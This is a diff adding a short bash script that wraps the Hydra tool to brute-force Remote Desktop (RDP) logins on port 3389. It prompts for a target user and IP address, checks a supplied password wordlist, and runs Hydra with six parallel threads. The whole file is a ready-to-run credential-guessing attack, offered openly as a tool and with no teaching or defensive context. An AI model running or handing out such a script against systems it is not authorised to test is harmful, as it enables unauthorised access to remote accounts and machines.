@@ -1,0 +1,30 @@
+#!/bin/bash
+
+echo "Hydra RDP Brute Force (3389)"
+
+# Input username
+read -p "Enter target user: " USER_BRUTE_FORCE
+
+# Input target IP
+read -p "Enter IP target: " IP
+
+# Wordlist password file
+WORDLIST="$1"
+
+# Check input
+if [[ -z "$USER_BRUTE_FORCE" || -z "$IP" || -z "$WORDLIST" ]]; then
+    echo "[!] Usage: $0 <password_list.txt>"
+    exit 1
+fi
+
+if [[ ! -f "$WORDLIST" ]]; then
+    echo "[!] Password file not found: $WORDLIST"
+    exit 1
+fi
+
+echo "[*] Target: $IP:3389"
+echo "[*] User: $USER_BRUTE_FORCE"
+echo "[*] Password list: $WORDLIST"
+
+# Run Hydra
+hydra -l "$USER_BRUTE_FORCE" -P "$WORDLIST" rdp://"$IP" -t 6 -W 2 -V
